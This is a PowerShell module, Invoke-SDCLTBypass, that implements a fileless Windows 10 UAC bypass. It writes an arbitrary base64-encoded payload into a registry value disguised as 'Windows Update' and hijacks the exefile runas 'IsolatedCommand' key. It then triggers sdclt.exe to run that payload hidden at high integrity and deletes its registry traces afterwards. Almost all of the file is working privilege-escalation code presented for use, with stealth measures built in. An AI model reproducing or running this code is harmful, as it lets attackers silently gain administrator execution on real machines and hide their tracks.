function Invoke-SDCLTBypass {
<#
.SYNOPSIS

Bypasses UAC by performing an registry modification of the "IsolatedCommand" value in "shell\runas\command" based on enigma0x3 findings (https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/)

Only tested on Windows 10

Author: Petr Medonos (@PetrMedonos)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.PARAMETER Command

 Specifies the base64 encoded command you want to run in a high-integrity context.

.EXAMPLE

Invoke-SDCLTBypass -Command "IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAJwApACkAIAAtACAAJAAoAEcAZQB0AC0ARABhAHQAZQApACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAVQBBAEMAQgB5AHAAYQBzAHMAVABlAHMAdAAuAHQAeAB0ACAALQBBAHAAcABlAG4AZAA="

This will write out "Is Elevated: True" to C:\UACBypassTest.

#>

    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Switch]
        $Force
    )
    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if(($(whoami /groups) -like "*S-1-5-32-544*").length -eq 0) {
        "[!] Current user not a local administrator!"
        Throw ("Current user not a local administrator!")
    }
    if (($(whoami /groups) -like "*S-1-16-8192*").length -eq 0) {
        "[!] Not in a medium integrity process!"
        Throw ("Not in a medium integrity process!")
    }

    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
        "UAC is set to 'Always Notify'. This module does not bypass this setting."
        exit
    }
    else{
        #Begin Execution
        #Store the payload
        $RegPath = 'HKCU:Software\Microsoft\Windows\Update'
        $parts = $RegPath.split('\');
        $path = $RegPath.split("\")[0..($parts.count -2)] -join '\';
        $name = $parts[-1];
        $null = Set-ItemProperty -Force -Path $path -Name $name -Value $Command;


        $exeCommandPath = "HKCU:\Software\Classes\exefile\shell\runas\command"
        $launcherCommand = $pshome + '\' + 'powershell.exe -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -w Hidden -enc $x'

        if ($Force -or ((Get-ItemProperty -Path $exeCommandPath -Name 'IsolatedCommand' -ErrorAction SilentlyContinue) -eq $null)){
            New-Item $exeCommandPath -Force |
                New-ItemProperty -Name 'IsolatedCommand' -Value $launcherCommand -PropertyType string -Force | Out-Null
        }else{
            Write-Warning "Key already exists, consider using -Force"
            exit
        }

        if (Test-Path $exeCommandPath) {
            Write-Verbose "Created registry entries to hijack the exe runas extension"
        }else{
            Write-Warning "Failed to create registry key, exiting"
            exit
        }

        $sdcltPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'sdclt.exe'
        if ($PSCmdlet.ShouldProcess($sdcltPath, 'Start process')) {
            $Process = Start-Process -FilePath $sdcltPath -ArgumentList '/kickoffelev' -PassThru
            Write-Verbose "Started sdclt.exe"
        }

        #Sleep 5 seconds 
        Write-Verbose "Sleeping 5 seconds to trigger payload"
        if (-not $PSBoundParameters['WhatIf']) {
            Start-Sleep -Seconds 5
        }

        $exefilePath = "HKCU:\Software\Classes\exefile"
				$PayloadPath = 'HKCU:Software\Microsoft\Windows'
				$PayloadKey = "Update"

        if (Test-Path $exefilePath) {
            #Remove the registry entry
            Remove-Item $exefilePath -Recurse -Force
						Remove-ItemProperty -Force -Path $PayloadPath -Name $PayloadKey
            Write-Verbose "Removed registry entries"
        }

        if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
            Stop-Process -Id $Process.Id
            Write-Verbose "Killed running sdclt process"
        }
    }
}
